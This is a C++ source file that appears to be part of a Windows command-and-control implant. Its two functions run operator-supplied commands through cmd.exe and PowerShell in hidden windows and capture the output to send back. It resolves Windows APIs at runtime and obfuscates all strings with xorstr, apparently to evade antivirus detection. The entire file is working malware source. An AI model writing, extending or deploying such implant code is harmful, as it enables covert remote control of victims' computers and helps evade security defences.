// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <cstdint>
#include <string>

#include "agent/commands/command_result.h"
#include "agent/commands/exec/shell.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    namespace {
        /// How long a shell command may run before the agent stops waiting for it.
        constexpr DWORD kShellTimeoutMs = 30000;
        /// Upper bound on the text carried back to the operator; a command can print endlessly.
        constexpr std::size_t kMaxOutputBytes = 32 * 1024;
    }  // namespace

    CommandResult RunShell(const models::CheckinResponse& task) {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto create_process =
            agent::util::resolve_api<decltype(&CreateProcessW)>(kernel32, xorstr_("CreateProcessW"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));
        const auto wait_for_single =
            agent::util::resolve_api<decltype(&WaitForSingleObject)>(kernel32, xorstr_("WaitForSingleObject"));
        const auto create_pipe = agent::util::resolve_api<decltype(&CreatePipe)>(kernel32, xorstr_("CreatePipe"));
        const auto read_file = agent::util::resolve_api<decltype(&ReadFile)>(kernel32, xorstr_("ReadFile"));
        const auto get_exit_code =
            agent::util::resolve_api<decltype(&GetExitCodeProcess)>(kernel32, xorstr_("GetExitCodeProcess"));

        if (create_process == nullptr || close_handle == nullptr || wait_for_single == nullptr ||
            create_pipe == nullptr || read_file == nullptr || get_exit_code == nullptr) {
            return CommandResult::Error(xorstr_("Shell: could not resolve the kernel32 entry points"));
        }

        const std::string command = task.run_command.empty() ? task.command.commandlet : task.run_command;
        if (command.empty()) {
            return CommandResult::Error(xorstr_("No shell command supplied"));
        }

        std::wstring command_line =
            agent::util::ToWide(std::string(xorstr_(R"(cmd.exe /c )"))) + agent::util::ToWide(command);

        // One pipe for stdout and stderr: a shell command's output is what the operator asked for,
        // and a single read side cannot deadlock against a full stderr buffer the way two
        // independently-read pipes can when only one is drained at a time.
        SECURITY_ATTRIBUTES inherit{};
        inherit.nLength = sizeof(inherit);
        inherit.bInheritHandle = TRUE;
        inherit.lpSecurityDescriptor = nullptr;

        HANDLE read_end = nullptr;
        HANDLE write_end = nullptr;
        if (!create_pipe(&read_end, &write_end, &inherit, 0)) {
            return CommandResult::Error(xorstr_("Shell: could not create the output pipe (GetLastError ") +
                                        std::to_string(GetLastError()) + xorstr_(")"));
        }

        STARTUPINFOW startup_info{};
        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        startup_info.wShowWindow = SW_HIDE;
        startup_info.hStdOutput = write_end;
        startup_info.hStdError = write_end;
        startup_info.hStdInput = nullptr;
        PROCESS_INFORMATION process_info{};

        // bInheritHandles must be TRUE for the child to see the pipe, which is why the child gets
        // only these handles: the agent opens its own with non-inheritable handles.
        const BOOL created = create_process(nullptr, command_line.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
                                            nullptr, nullptr, &startup_info, &process_info);
        close_handle(write_end);  // the child holds its own copy; ours would keep the pipe open
        if (!created) {
            const DWORD launch_error = GetLastError();
            close_handle(read_end);
            return CommandResult::Error(xorstr_("Failed to start shell command (GetLastError ") +
                                        std::to_string(launch_error) + xorstr_(")"));
        }

        std::string output;
        char buffer[4096];
        DWORD bytes_read = 0;
        while (output.size() < kMaxOutputBytes &&
               read_file(read_end, buffer, static_cast<DWORD>(sizeof(buffer)), &bytes_read, nullptr) != FALSE &&
               bytes_read > 0) {
            output.append(buffer, bytes_read);
        }
        close_handle(read_end);

        if (output.size() > kMaxOutputBytes) {
            output.resize(kMaxOutputBytes);
            output += xorstr_("\n[output truncated]");
        }

        const DWORD waited = wait_for_single(process_info.hProcess, kShellTimeoutMs);
        DWORD exit_code = 0;
        if (waited == WAIT_TIMEOUT) {
            // The command outlived the wait: report that honestly instead of a clean success.
            close_handle(process_info.hThread);
            close_handle(process_info.hProcess);
            return CommandResult::Error(xorstr_("Shell command still running after 30s; output so far:\n") + output);
        }
        get_exit_code(process_info.hProcess, &exit_code);
        close_handle(process_info.hThread);
        close_handle(process_info.hProcess);

        if (exit_code != 0) {
            return CommandResult::Error(xorstr_("Shell command failed (exit code ") + std::to_string(exit_code) +
                                        xorstr_("):\n") + output);
        }

        if (output.empty()) {
            return CommandResult::Ok(xorstr_("Shell command completed with no output"));
        }

        return CommandResult::Ok(output);
    }

    CommandResult RunPowershell(const models::CheckinResponse& task) {
        // ShellExecuteA is exported by shell32.dll (loaded on demand by get_module).
        const HMODULE shell32 = agent::util::get_module(xorstr_("shell32.dll"));
        const auto shell_execute =
            agent::util::resolve_api<decltype(&ShellExecuteA)>(shell32, xorstr_("ShellExecuteA"));

        // ShellExecuteA does not split lpFile into executable plus arguments: passing the whole
        // command line as lpFile makes it look for a binary named "powershell -Command ..." and
        // returns SE_ERR_FILE_NOT_FOUND (2) without launching anything. The executable and the
        // parameters are separate arguments (verified on the guest: same call returns 42).
        std::string arguments = xorstr_("-Command \"");
        arguments += task.command.commandlet;
        if (!task.command.arguments.empty()) {
            arguments += xorstr_(" ");
            arguments += task.command.arguments;
        }
        arguments += xorstr_("\"");

        // ShellExecuteA reports values <= 32 as errors; ignoring the result made a failure to
        // launch look like a completed command.
        HINSTANCE launched =
            shell_execute(nullptr, xorstr_("open"), xorstr_("powershell.exe"), arguments.c_str(), nullptr, SW_HIDE);
        if (reinterpret_cast<std::intptr_t>(launched) <= 32) {
            return CommandResult::Error(xorstr_("Failed to start powershell (ShellExecute returned ") +
                                        std::to_string(reinterpret_cast<std::intptr_t>(launched)) + xorstr_(")"));
        }
        return CommandResult::Ok(xorstr_("Command executed"));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
